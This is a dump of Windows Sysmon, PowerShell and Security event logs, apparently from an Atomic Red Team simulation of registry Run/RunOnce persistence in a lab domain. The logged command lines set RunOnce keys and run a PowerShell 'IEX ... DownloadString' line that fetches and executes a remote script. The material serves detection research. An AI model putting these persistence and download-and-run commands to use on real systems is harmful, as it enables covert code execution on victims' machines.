Name='TargetObject'>HKU\S-1-5-21-1043487626-1088152272-4246291469-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\RunScript</Data><Data Name='Details'>C:\setup\script.cmd</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:44.059888200Z'/><EventRecordID>111536</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:13:44.058</Data><Data Name='ProcessGuid'>{E163F41D-AF58-620D-7F13-000000003602}</Data><Data Name='ProcessId'>6784</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>REG  ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v RunScript /t REG_SZ /d "C:\setup\script.cmd" /f</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AF1C-620D-F53F-BD0000000000}</Data><Data Name='LogonId'>0xbd3ff5</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=59A22FA6CF85026BB6BC69A1ADD75C50,SHA256=9E28034CE3AEEA6951F790F8997DF44CFBF80BEFF9FB17413DBA317016A716AD,IMPHASH=EE7EB7FA7D163340753B7223ADA14352</Data><Data Name='ParentProcessGuid'>{E163F41D-AF47-620D-5613-000000003602}</Data><Data Name='ParentProcessId'>892</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" </Data></EventData></Event>
+02/17/2022 02:13:43 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1043487626-1088152272-4246291469-500
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=129851
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+{$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'}
+
+ScriptBlock ID: 92c6a657-c4e8-4cdb-9efa-b04433ca0bbb
+Path:
+02/17/2022 02:13:43 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+EventCode=4104
+EventType=5
+Type=Verbose
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1043487626-1088152272-4246291469-500
+SidType=0
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+RecordNumber=129849
+Keywords=None
+Message=Creating Scriptblock text (1 of 1):
+& {$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'}
+
+ScriptBlock ID: 41c474fc-83c8-4d76-943f-7481a352bd7a
+Path:
+02/17/2022 02:13:43 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8878371
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xC9C686
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1964
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x14c8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {$RunOnceKey = \""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""
+set-itemproperty $RunOnceKey \""NextRun\"" 'powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\"")\""'} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:13:43 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8878354
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xC9C686
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1958
+	New Process Name:	C:\Windows\System32\reg.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1970
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	REG  ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/17/2022 02:13:43 AM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-dc-cloudarrod-133.attackrange.local
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=8878353
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		ATTACKRANGE\Administrator
+	Account Name:		Administrator
+	Account Domain:		ATTACKRANGE
+	Logon ID:		0xC9C686
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1970
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x14c8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:43.772483600Z'/><EventRecordID>111497</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2022-02-17 02:13:43.761</Data><Data Name='ProcessGuid'>{E163F41D-AF57-620D-7C13-000000003602}</Data><Data Name='ProcessId'>6500</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun</Data><Data Name='Details'>powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:43.606682200Z'/><EventRecordID>111479</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:13:43.604</Data><Data Name='ProcessGuid'>{E163F41D-AF57-620D-7C13-000000003602}</Data><Data Name='ProcessId'>6500</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.14393.206 (rs1_release.160915-0644)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" &amp; {$RunOnceKey = \""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""
+set-itemproperty $RunOnceKey \""NextRun\"" 'powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\"")\""'} </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AF55-620D-86C6-C90000000000}</Data><Data Name='LogonId'>0xc9c686</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data><Data Name='ParentProcessGuid'>{E163F41D-AF56-620D-7313-000000003602}</Data><Data Name='ParentProcessId'>5320</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADQANwAuADAAMAAxACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:43.577250600Z'/><EventRecordID>111469</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2022-02-17 02:13:43.573</Data><Data Name='ProcessGuid'>{E163F41D-AF57-620D-7B13-000000003602}</Data><Data Name='ProcessId'>6488</Data><Data Name='Image'>C:\Windows\system32\reg.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1</Data><Data Name='Details'>C:\Path\AtomicRedTeam.dll</Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:43.572361600Z'/><EventRecordID>111461</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:13:43.570</Data><Data Name='ProcessGuid'>{E163F41D-AF57-620D-7B13-000000003602}</Data><Data Name='ProcessId'>6488</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>REG  ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll" </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AF55-620D-86C6-C90000000000}</Data><Data Name='LogonId'>0xc9c686</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=59A22FA6CF85026BB6BC69A1ADD75C50,SHA256=9E28034CE3AEEA6951F790F8997DF44CFBF80BEFF9FB17413DBA317016A716AD,IMPHASH=EE7EB7FA7D163340753B7223ADA14352</Data><Data Name='ParentProcessGuid'>{E163F41D-AF57-620D-7A13-000000003602}</Data><Data Name='ParentProcessId'>6512</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"" </Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-02-17T02:13:43.565014500Z'/><EventRecordID>111452</EventRecordID><Correlation/><Execution ProcessID='2848' ThreadID='2316'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-cloudarrod-133.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-02-17 02:13:43.563</Data><Data Name='ProcessGuid'>{E163F41D-AF57-620D-7A13-000000003602}</Data><Data Name='ProcessId'>6512</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"" </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{E163F41D-AF55-620D-86C6-C90000000000}</Data><Data Name='LogonId'>0xc9c686</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A</Data><Data Name='ParentProcessGuid'>{E163F41D-AF56-620D-7313-000000003602}</Data><Data Name='ParentProcessId'>5320</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQA1ADQANwAuADAAMAAxACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data></EventData></Event>
